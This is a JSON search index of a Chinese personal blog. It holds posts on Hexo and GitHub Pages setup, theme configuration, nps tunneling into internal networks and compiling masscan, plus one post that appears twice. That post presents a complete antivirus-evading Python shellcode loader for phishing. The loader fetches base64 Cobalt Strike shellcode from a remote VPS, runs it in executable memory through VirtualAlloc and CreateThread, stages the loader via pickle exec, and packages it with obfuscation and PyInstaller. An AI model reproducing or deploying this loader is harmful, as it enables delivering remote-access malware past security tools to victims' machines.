[{"title":"Github+Hexo搭建静态博客","url":"/2021/12/18/2021/01.Github+Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2-2021.12.18/","content":"大佬们多在前方辛苦淌路，只有我在后面享受着大佬的果实。\n\n\n\n一、前言：我一直都有搭建博客的想法。不为出名。只为想通过强迫“记笔记”的方式，加速自己学习。\n曾经在腾讯云的VPS上面通过WordPress搭建了博客。\n但是由于WordPress太知名，也太致命。所以后续断断续续都舍弃了。\n今天无意间看到了@Assassins 小白大佬第一篇博客《Github+Hexo搭建静态博客》。\n每一步都非常详细。简直是嚼碎了喂在嘴里。也开阔了我的想法——原来博客可以搭建在github的平台上。通过静态页面也减少了网页受攻击的问题。\n于是，在了解了Hexo这个静态站点生成器后。略汗颜的向大佬在19年8月份写的这篇文章学习。\n在此仅作为一个留存记录，多半都是复制粘贴。原文请见：@Assassins 小白大佬的《Github+Hexo搭建静态博客》。\n\n二、步骤2.1 安装Node与Git2.1.1 先安装下面两个软件\nNode.js：https://nodejs.org/en/\n\n\nWindows下的Node.js安装及环境配置：https://www.cnblogs.com/liuqiyun/p/8133904.html\n\n\nGit：https://git-scm.com/download/win\n\n\nGit安装教程（详细）：https://www.jianshu.com/p/bebba0d8038e\n\n2.2 本地安装与初始化hexo2.2.1使用npm安装hexo安装命令： npm install -g hexo-cli \n【自己安装图片找不到了，图片再复制大佬的有些过分】\n\n不过按照上面node的环境配置，修改好安装的全局模块所在的路径，以及缓存cache的路径。\n没有报错就行。\n\n安装完了验证一下是否成功，命令:\nnpx hexo -v\n\n注：这里跟 19年相比。npm install后不能直接调用命令。会提示命令找不到。需要在前面 + npx \n\nok 安装完成\n2.2.2 接下来我们先用hexo进行本地建站先初始化Blog网站框架\n在本地电脑上建立一个Blog目录，并在shell中进行下面命令，初始化框架\nnpx hexo init &lt;文件夹&gt; //博客文件夹名称\n\n\n\nps：npx安装打印输出的东西。比19年的精简了太多。\n\ncd &lt;文件夹&gt;               //进入博客文件夹目录npm install\n\n\n2.2.3 网页配置：_config.yml\n整个站点的配置信息：可以配置网站的title、author、language、目录、文章、日期、分页、扩展（主题名称、部署）信息，这个文件是博客配置文件，改错了会导致网站不正常。里面主要需要用到的内容有：\n\nsource: 资源文件夹,存放用户资源，这个是博客文章源码所存放的地方\nthemes: 主题文件夹，Hexo会根据此来生成静态页面，默认是官方的landscape主题\n\n2.2.4 写blog 文章执行下面的命令创建一篇新的文章:\nhexo new &lt;文章名&gt;\n\n\n生成的文章在source/_posts文件夹下面\n\n可以看到文章已经生成好了\n命令：\n$ npx hexo generate` 简写： `hexo g\n\n生成静态文件\n2.2.5 启动hexo静态页面服务$ npx hexo server   简写： hexo s\n\n\n启动服务器，默认情况下，访问网址为： http://localhost:4000\n\nok这就是本地搭建成功的效果，不过这是默认主题，可以根据需要改主题\n2.3 Github的配置先注册GitHub账号，这个我就不说了。\n2.3.1 设置GitHub SSH Key本地设置git邮箱、用户名和密码\ngit config --global user.email &quot;你注册GitHub的邮箱&quot;git config --global user.name &quot;你的GitHub用户名&quot;\n\n本地创建SSH Key\nssh-keygen -t rsa -C &quot;邮箱地址”\n\n\n首先打开用户根目录（用户根目录一般为为C:\\Users\\username）查看是否已经有了SSH Key的文件夹.ssh\n\n添加生成的SSH Key到GitHub账户\n打开在当前用户的根目录下生成的.ssh文件里面的ssh.pub（ssh 公钥）,拷贝其内容到[SSH and GPG keys -&gt; SSH Keys -&gt; Add SSH Key]\n\n\n验证下SSH是否设置成功\nssh -T git@github.com\n\n第一次提示不能连接，直接输入yes即可。\n\n2.3.2 GitHub部署新储存库建立GitHub Pages之后，即可以将本地搭建的Hexo网站部署到GitHub上去\n创建存储库，名字就写你GitHub名字+Github.io\n\n按照这个命令，全都敲一遍。\n\n\ngit push -u origin main 这一步总是报timeout错。\n不过这个命令只有生成新项目的时候才会用到，以后不会用到了。所以成功一次就行。\n我的解决办法是开着全局代理然后有一次就成功了。\n理论上可以修改git push 的等待时间。改成5s就好了。\n但我没成功了就没弄。\n\n\n2.3.3 修改站点_config.yml配置文件repo: https://github.com/username/username.github.io.git （你的GitHub页面仓库地址）branch: master\n\n\n2.3.4 博客文件夹目录执行命令博客文件夹目录执行命令\nnpx Hexo g -d\n\n\n报错 ERROR Deployer not found: git ，输入命令：\nnpm install hexo-deployer-git --save\n\n\n再输入命令：\nnpx Hexo g -d\n\n部署到GitHub。访问域名(https://你的GitHub名字.github.io)\n\n成了。\n三、参考链接\nGithub+Hexo搭建静态博客（几乎完全按照做的）\nhexo史上最全搭建教程\n使用命令npm install -g hexo-cli 安装Hexo报错bash: hexo: command not found问题解决\n\n","categories":["博客搭建"]},{"title":"个性化设置hexo博客","url":"/2021/12/18/2021/02.%E4%B8%AA%E6%80%A7%E5%8C%96%E8%AE%BE%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2-2021.12.18/","content":"该文章也是参考了@Assassins 小白大佬的《Github+Hexo搭建静态博客》。\n不过对我个人而言，搭建博客跟使用博客分开记录更方便后期的一个查找学习。于是便有了这篇笔记。\n\n\n\n一、换一个主题模板有一说一。@Assassins 小白大佬使用的这个 Next-Mist 模板确实好看。我真是心动不已。\n不过主题那么多，还是换一个同样好看的吧。\n搜了一会儿。决定使用 keep 主题。经过了解，他比较简约，挺适合我作为学习笔记来记录的。keep-中文使用教程\n到博客根目录打开Shell终端，输入下面命令\ngit clone https://github.com/XPoet/hexo-theme-keep themes/keep\n\n\n\n完成，设置配置文件。这里改下模板的名字\n 本地搭建看一下效果\nnpx Hexo s\n\n\n就这个吧。\n二、设置主题模板【基于keep主题】按照keep-中文使用教程 进行配置。\n2.1 给博客添加分类标签：2.1.1 修改 Angleashuaiby\\themes\\keep\\_config.yml 配置文件menu:  首页: /  归档: /archives  分类: /categories  # Tags: /tags  # Links: /links\n\n改好后输入命令\nnpx hexo new page categories\n\n\n2.1.2 修改 Angleashuaiby\\scaffolds\\_post.md 配置文件scaffolds目录下，是新建页面的模板，执行新建命令时，是根据这里的模板页来完成的，所以可以在这里根据你自己的需求添加一些默认值。\n打开scaffolds/post.md文件，在tages:上面加入categories:,保存后，重新执行hexo n &#39;name&#39;命令，会发现新建的页面里有categories:项了。\n\n配置就已经ok了\n2.1.3 写文章以后写文章时手动的在categories 添加分类内容即可。\n\n2.2 给博客开启文章字数统计和阅读时长2.2.1 安装依赖此时的配置文件是 E:\\Angleashuaiby\\themes\\keep\\_config.yml \n如果要开启文章字数统计和阅读时长，需在 Hexo 项目根目录下安装依赖 hexo-wordcount 。\nnpm install hexo-wordcount\n\n\n2.2.2 修改 Angleashuaiby\\themes\\keep\\_config.yml 配置文件post:  # Post word count  # Dependencies: hexo-wordcount (npm install hexo-wordcount)  # See: https://github.com/willin/hexo-wordcount  word_count:    enable: true    wordcount: true # word count, one article    min2read: true # time to read, one article\n\n\nwordcount 文章字数统计\nmin2read 文章阅读时长\n\n2.3 开启搜索功能:2.3.1 修改 Angleashuaiby\\themes\\keep\\_config.yml 配置文件local_search:  enable: true  preload: true # 表示是否在页面加载时预加载搜索数据。\n\n2.3.2 安装依赖在 Hexo 项目根目录下安装插件 hexo-generator-searchdb。\nnpm install hexo-generator-searchdb\n\n\n2.3.3 修改hexo的配置修改 E:\\Angleashuaiby\\_config.yml 文件。在下方添加以下内容：\n# Search## See: https://github.com/theme-next/hexo-generator-searchdbsearch:  path: search.json  field: post  content: true  format: striptags\n\n大功告成。\n2.4 博客的其他设置base_info:  title: Angleashuaiby&#x27;s note  author: Angleashuaiby  url: https://angleashuaiby.github.io/  设置了作者头像，logo。开启了缩放阴影效果：  hover:    shadow: true # shadow effect when the mouse hover    scale: true # scale effect when the mouse hover  开启了首页文章块底部的分类信息显示： home_article:  category:    enable: true # show category in home page article block     开启了代码复制，开启后可一键复制代码到剪贴板。： code_copy:    enable: true  开启目录结构：toc:  enable: true  # Automatically add list number to toc.  number: false  # If true, all level of TOC in a post will be displayed, rather than the activated part of it.  expand_all: true  # If true, open TOC every time when you enter the article page  init_open: true  开启阅读次数查询:website_count:  # busuanzi  # See: http://ibruce.info/2015/04/04/busuanzi/  busuanzi_count:    enable: true    site_uv: false    site_pv: false    page_pv: true开启图片懒加载功能：（试用）开启后，打开页面时不会加载所有图片，当视窗滚动到图片位置才加载对应的图片资源。lazyload:  enable: true  开启CDN:    该配置项用于开启部分主题资源（JS 文件、字体文件等）的 CDN 加速功能。  \n","categories":["博客搭建"]},{"title":"nps内网穿透","url":"/2022/06/24/2022/nps%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","content":"当你真正喜欢做一件事时，自律就会成为你的本能。\n\n\n\nNPS工具简介nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。\n官网下载地址：https://github.com/ehang-io/nps/\n官网手册：https://ehang-io.github.io/nps/#/\n\n一、服务端1.1 服务端的安装进入官网下载对应版本的服务端nps软件。根据VPS的系统来进行下载，我这里下载的是linux_amd64_server.tar.gz版本。\n将此压缩包上传至VPS，此处假设文件夹路径为/root/nps。执行代码：\ntar -xzvf linux_amd64_server.tar.gzrm -rf linux_amd64_server.tar.gzsudo ./nps install  \t\t#一定要执行安装命令。sudo nps start/stop/restart\t\t\t\t\t#此命令用来控制nps服务端的启停默认的web登录端口为 8080 ，口令为：admin/123\n\n1.2 服务端修改配置登录成功后一定要修改相关密码，修改配置文件。\n\n一定要改账密和web控制端端口。\n要确保能从客户端设备上正常访问配置文件中所配置的bridge_port端口\n此配置文件才是真正用来控制nps的。要在此处进行账密的更改，更改后重启nps更新配置。\n\nsudo vim /etc/nps/conf/nps.conf\n\n1.3 服务web控制端 添加 客户端监听\n\n备注：名字\nBasic认证的用户名/密码： Socks代理时需要用到的用户名和密码\n唯一验证秘钥：客户端需要用到的东西，但是留空可以自动生成。\n其他就顾名思义了。\n\n\n\n这个秘钥客户端需要用到\n\n二、客户端2.1 客户端通过秘钥链接优点：通过秘钥链接的无需传配置文件信息。\n解压客户端windows主机上的windows_amd64_client.tar.gz，并在CMD中运行命令。\nnpc.exe -server=你的nps:8024 -vkey=你的密钥  注：点击web管理中客户端前的+号，即可复制启动命令\n\n\n如果有连接\n这里会由离线变成在线。此时成功连接。\n\n注：连接时，火绒会提示有软件尝试安装。【猜测是临时安装服务器的配置信息】\n2.2客户端通过配置信息连接此模式使用nps的公钥或者客户端私钥验证，各种配置在客户端完成，同时服务端web也可以进行管理。\n使用命令：\n./npc -config=npc配置文件路径\n\n配置文件说明：\n参考链接：https://ehang-io.github.io/nps/#/use?id=配置文件说明\n据学习，还是第一种方法要便捷。故此处不作过多介绍。\n\n三、配置socks5代理进行内网穿透要等客户端上线以后在配置Socks代理。连接后，点击隧道按钮——&gt;新增。\n\n\n\n模式选择 socks代理\n客户端ID 自动选择，如果没有，则看 客户端列表 连接的ID。此处为4\n备注留空\n服务端端口就是各种代理器去访问的端口。此处为8083。\n\n\n\n此时，使用Proxifier进行尝试。就成了。\n\n!\n","categories":["内网攻击"]},{"title":"windows下编译masscan","url":"/2022/06/16/2022/windows%E4%B8%8B%E7%BC%96%E8%AF%91masscan/","content":"知识共享不代表成果掠夺！！！\n\n\n\n前言：在做大批量内网端口扫描的时候，觉得nmap有些慢。\n突然想到Masscan工具，但是GitHub官网上没有编译好的。又不敢下载使用别人编译好的文件。\n所以想自行编译使用。但百度所搜的文章千篇一律。\n\n作者心语：全是复制粘贴，一个字都不改。还不贴原作者的链接。我根本不知道原作者是哪个大佬。\n知识共享不代表成果掠夺！！！\n\n且所复制的文章教的太过笼统，对初学者（我）超级不友好。\n于是便有了此笔记。用来记录我的编译过程。希望能够帮到其他的初学者。\n本文章的技术参考链接：https://blog.csdn.net/qq_38547744/article/details/105241525\n\n一、 masscan简介github地址：https://github.com/robertdavidgraham/masscan\n\n二、项目编译2.1 编译环境介绍我个人使用的是社区版的VS2019。\n\n附 VS官方下载链接：\n\nVisual Studio 2019的下载地址\n\nVisual Studio 最新版 2022的下载地址\n\n\n2.2 正式编译从github下载后,打开vs10文件夹中的所选项目。\n\n打开这个文件的时候，如果 VS没有安装 “ 使用C++的桌面开发 “ 的工作载荷会跳出提示。\n选择确认安装即可。\n\n\n由于我用的是VS2019，所以需要添加编译配置\nSource Files-&gt;misc-&gt;string_s.h中添加。\n\n作者心语：这三个是masscan.sln文件里面的内容。\n我初次体验VS，还以为是VS的系统设置。找了半天 = _ =\n\n\n源博客讲述的是添加一定的代码。例如这样：\n\n但是我发现添加的内容，跟下方的代码几乎一致。\n后期经过大胆试验。可以直接将下方1900替换为1929即可。此方法更为简单，且极不容易报错踩坑。\n\n作者心语：跟着原文章添加，编译时报了很多错误。由于是初次编译代码，所以对于我来说，调试很难。\n通过此方法，没有报错。所以我就没有踩坑总结。\n\n如图所示：\n\n\n问：如何知道要填的为1929。而不是别的数字呢？\n答：_MSC_VER是微软用来定义编译器主版本的宏定义。其中_MSC_VER == 1929 的1929 是要根据不同版本的VS替换的。\n要去这个网址查：https://docs.microsoft.com/en-us/cpp/preprocessor/predefined-macros?view=msvc-170。\n在最下方的表格处。或者直接页面搜索_MSC_VER\n\n由于我是Visual Studio 2019 version 16.11。所以此处为1929。\n\n最后点击”本地windows调试器”。\n\n没有报错就是成了。\n\n生成的文件在 bin 目录下\n\n\n\n成功啦。希望同行初学者同样顺利！！！\n","categories":["杂七杂八"]},{"title":"python免杀shellcode加载器","url":"/2022/07/04/2022/python%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/","content":".在真实的性命里，每桩伟业都由信心开始，并由信心跨出第一步。\n\n\n0、前言客户现场需要做钓鱼邮件演练。笔者在互联网上查找免杀方式的时候，发现了一个比较新颖的方法、在此记录。\n主要参考文章为：CS结合python3混淆shellcode制作免杀脚本\n具体实现流程：shellcode和加载器(pyminifier混淆后)经base64编码后，放远程服务器备用，然后目标主机远程下载两次。具体流程如图所示：\n\n笔者在此基础上进行了代码分析以及补充了收集到的免杀技巧总结。\n\n1、shellcodeCS生成shellcode。把shellcode进行Base64编码后放在shellcode.txt里面并存放到服务器\n\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x2c......\n\n\n2、加载器修改加载器的服务器地址后进行一次base64加密，然后把代码放在loader.txt里面并存放到服务器\n2.1 代码如下：import ctypes,urllib.request,codecs,base64shellcode = urllib.request.urlopen(&#x27;http://vps的ip地址/shellcode.txt&#x27;).read()shellcode = shellcode.strip()shellcode = base64.b64decode(shellcode)shellcode =codecs.escape_decode(shellcode)[0]shellcode = bytearray(shellcode)ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(    ctypes.c_uint64(ptr),    buf,    ctypes.c_int(len(shellcode)))handle = ctypes.windll.kernel32.CreateThread(    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_uint64(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n2.2 加载器代码解析：首先是获取shellcode的值，并进行base64解码\nshellcode = urllib.request.urlopen(&#x27;http://vps的ip地址/shellcode.txt&#x27;).read()shellcode = shellcode.strip()shellcode = base64.b64decode(shellcode)shellcode = base64.b64decode(shellcode)shellcode =codecs.escape_decode(shellcode)[0]\n\n设置VirtualAlloc返回类型为ctypes.c_unit64\nctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\n\n调用VirtualAlloc函数，来申请一块动态内存区域。\nptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))\n\n\n VirtualAlloc函数原型和参数如下：\n LPVOID VirtualAlloc&#123;LPVOID lpAddress, #要分配的内存区域的地址DWORD dwSize,      #分配的大小DWORD flAllocationType, #分配的类型DWORD flProtect     #该内存的初始保护属性&#125;;\n\n将shellcode指向指针\nbuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\n\n调用RtlMoveMemory函数可以将shellcode载入内存。从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大\nctypes.windll.kernel32.RtlMoveMemory(    ctypes.c_uint64(ptr),    buf,    ctypes.c_int(len(shellcode)))\n\n\nRtlMoveMemory的原型和参数如下：\nRtlMoveMemory&#123;Destination,\t#指向移动目的地址的指针。Source,\t\t#指向要复制的内存地址的指针。Length\t\t#指定要复制的字节数。&#125;; \n\n调用 CreateThread 函数，完成shellcode注入\nhandle = ctypes.windll.kernel32.CreateThread(    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_uint64(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n\nCreateThread的原型和参数如下：\nHANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性SIZE_T dwStackSize,       #置初始栈的大小，以字节为单位LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针LPVOID lpParameter,          #向线程函数传递的参数DWORD dwCreationFlags,       #线程创建属性LPDWORD lpThreadId           #保存新线程的id)\n\n等待线程结束调用WaitForSingleObject函数用来检测线程的状态\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n\nWaitForSingleObject函数原型和参数\nDWORD WINAPI WaitForSingleObject(__in HANDLE hHandle,     #对象句柄。可以指定一系列的对象__in DWORD dwMilliseconds  #定时时间间隔);\n\n\n3、主程序zhu.py,最终在目标上执行的exe文件。\n修改服务器地址后使用pyinstaller打包成exe可执行文件\n3.1 实现代码如下import pickleimport ctypes,urllib.request,codecs,base64sectr = urllib.request.urlopen(&#x27;http://vps的ip地址/loader.txt&#x27;).read()sectr = base64.b64decode(sectr).decode(&quot;utf-8&quot;)class A(object):    def __reduce__(self):        return (exec, (sectr,))ret = pickle.dumps(A())ret_base64 = base64.b64encode(ret)ret_decode = base64.b64decode(ret_base64)pickle.loads(ret_decode)\n\n3.2 代码解析先对Class A进行序列化，再对序列化的代码进行base64加密。\nclass A(object):    ...ret = pickle.dumps(A())ret_base64 = base64.b64encode(ret)\n\n最后反序列化加载loader.\nret_decode = base64.b64decode(ret_base64)pickle.loads(ret_decode)\n\n通过__reduce__这个魔术方法执行了loader\ndef __reduce__(self):        return (exec, (sectr,))\n\n\n4、其他免杀小技巧总结：4.1 缩小和混淆py代码缩小python代码\npyminify zhu.py --output zhu_mini.py\n\n混淆main-mini.py中的python代码 \nhttps://pyob.oxyry.com/\n\n\n4.2 Pyinstaller打包成可执行文件exe将混淆后的代码保存到一个文件后\npyinstaller.exe -Fw -i .\\setting.ico --key=123456 .\\final.py\n\n\n五、免杀效果\n\n\n六、笔者总结：杀毒软件的原理一般是匹配特征码，行为监测，虚拟机（沙箱），内存查杀等。对抗特征码的检查的方式大致分为 混淆代码 与 编译代码。当下不仅shellcode作为特征码识别。加载器代码的部分代码也已经被当做特征码识别了。所以对加载器的各种处理也是必要的。\n此文章的免杀的思路为：\n\n进行了Base64编码解码以及python的序列化与反序列化的绕过。\n通过shellcode与加载器的分离。二次请求来进一步增加了静态免杀的概率。\n与大佬进行讨论时：目前免杀用base64编码绕过较多，部分安全软件属实可以检测到。业内很少用加密绕过的。若用aes加密绕过，免杀效果更佳。\n\n\n参考链接：\nCS结合python3混淆shellcode制作免杀脚本。\n\nPython简单免杀shellcode上线CS\n\npython-shellcode加载器初体验\n\n\n","categories":["杂七杂八"]},{"title":"python免杀shellcode加载器","url":"/2022/07/04/python%E5%85%8D%E6%9D%80shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/","content":".在真实的性命里，每桩伟业都由信心开始，并由信心跨出第一步。\n\n\n0、前言客户现场需要做钓鱼邮件演练。笔者在互联网上查找免杀方式的时候，发现了一个比较新颖的方法、在此记录。\n主要参考文章为：CS结合python3混淆shellcode制作免杀脚本\n具体实现流程：shellcode和加载器(pyminifier混淆后)经base64编码后，放远程服务器备用，然后目标主机远程下载两次。具体流程如图所示：\n\n笔者在此基础上进行了代码分析以及补充了收集到的免杀技巧总结。\n\n1、shellcodeCS生成shellcode。把shellcode进行Base64编码后放在shellcode.txt里面并存放到服务器\n\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x2c......\n\n\n2、加载器修改加载器的服务器地址后进行一次base64加密，然后把代码放在loader.txt里面并存放到服务器\n2.1 代码如下：import ctypes,urllib.request,codecs,base64shellcode = urllib.request.urlopen(&#x27;http://vps的ip地址/shellcode.txt&#x27;).read()shellcode = shellcode.strip()shellcode = base64.b64decode(shellcode)shellcode =codecs.escape_decode(shellcode)[0]shellcode = bytearray(shellcode)ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(    ctypes.c_uint64(ptr),    buf,    ctypes.c_int(len(shellcode)))handle = ctypes.windll.kernel32.CreateThread(    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_uint64(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n2.2 加载器代码解析：首先是获取shellcode的值，并进行base64解码\nshellcode = urllib.request.urlopen(&#x27;http://vps的ip地址/shellcode.txt&#x27;).read()shellcode = shellcode.strip()shellcode = base64.b64decode(shellcode)shellcode = base64.b64decode(shellcode)shellcode =codecs.escape_decode(shellcode)[0]\n\n设置VirtualAlloc返回类型为ctypes.c_unit64\nctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\n\n调用VirtualAlloc函数，来申请一块动态内存区域。\nptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))\n\n\n VirtualAlloc函数原型和参数如下：\n LPVOID VirtualAlloc&#123;LPVOID lpAddress, #要分配的内存区域的地址DWORD dwSize,      #分配的大小DWORD flAllocationType, #分配的类型DWORD flProtect     #该内存的初始保护属性&#125;;\n\n将shellcode指向指针\nbuf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\n\n调用RtlMoveMemory函数可以将shellcode载入内存。从指定内存地址将内容复制到我们申请的内存中去，shellcode字节多大就复制多大\nctypes.windll.kernel32.RtlMoveMemory(    ctypes.c_uint64(ptr),    buf,    ctypes.c_int(len(shellcode)))\n\n\nRtlMoveMemory的原型和参数如下：\nRtlMoveMemory&#123;Destination,\t#指向移动目的地址的指针。Source,\t\t#指向要复制的内存地址的指针。Length\t\t#指定要复制的字节数。&#125;; \n\n调用 CreateThread 函数，完成shellcode注入\nhandle = ctypes.windll.kernel32.CreateThread(    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_uint64(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n\nCreateThread的原型和参数如下：\nHANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性SIZE_T dwStackSize,       #置初始栈的大小，以字节为单位LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针LPVOID lpParameter,          #向线程函数传递的参数DWORD dwCreationFlags,       #线程创建属性LPDWORD lpThreadId           #保存新线程的id)\n\n等待线程结束调用WaitForSingleObject函数用来检测线程的状态\nctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))\n\n\nWaitForSingleObject函数原型和参数\nDWORD WINAPI WaitForSingleObject(__in HANDLE hHandle,     #对象句柄。可以指定一系列的对象__in DWORD dwMilliseconds  #定时时间间隔);\n\n\n3、主程序zhu.py,最终在目标上执行的exe文件。\n修改服务器地址后使用pyinstaller打包成exe可执行文件\n3.1 实现代码如下import pickleimport ctypes,urllib.request,codecs,base64sectr = urllib.request.urlopen(&#x27;http://vps的ip地址/loader.txt&#x27;).read()sectr = base64.b64decode(sectr).decode(&quot;utf-8&quot;)class A(object):    def __reduce__(self):        return (exec, (sectr,))ret = pickle.dumps(A())ret_base64 = base64.b64encode(ret)ret_decode = base64.b64decode(ret_base64)pickle.loads(ret_decode)\n\n3.2 代码解析先对Class A进行序列化，再对序列化的代码进行base64加密。\nclass A(object):    ...ret = pickle.dumps(A())ret_base64 = base64.b64encode(ret)\n\n最后反序列化加载loader.\nret_decode = base64.b64decode(ret_base64)pickle.loads(ret_decode)\n\n通过__reduce__这个魔术方法执行了loader\ndef __reduce__(self):        return (exec, (sectr,))\n\n\n4、其他免杀小技巧总结：4.1 缩小和混淆py代码缩小python代码\npyminify zhu.py --output zhu_mini.py\n\n混淆main-mini.py中的python代码 \nhttps://pyob.oxyry.com/\n\n\n4.2 Pyinstaller打包成可执行文件exe将混淆后的代码保存到一个文件后\npyinstaller.exe -Fw -i .\\setting.ico --key=123456 .\\final.py\n\n\n五、免杀效果\n\n\n六、笔者总结：杀毒软件的原理一般是匹配特征码，行为监测，虚拟机（沙箱），内存查杀等。对抗特征码的检查的方式大致分为 混淆代码 与 编译代码。当下不仅shellcode作为特征码识别。加载器代码的部分代码也已经被当做特征码识别了。所以对加载器的各种处理也是必要的。\n此文章的免杀的思路为：\n\n进行了Base64编码解码以及python的序列化与反序列化的绕过。\n通过shellcode与加载器的分离。二次请求来进一步增加了静态免杀的概率。\n与大佬进行讨论时：目前免杀用base64编码绕过较多，部分安全软件属实可以检测到。业内很少用加密绕过的。若用aes加密绕过，免杀效果更佳。\n\n\n参考链接：\nCS结合python3混淆shellcode制作免杀脚本。\n\nPython简单免杀shellcode上线CS\n\npython-shellcode加载器初体验\n\n\n","categories":["杂七杂八"]}]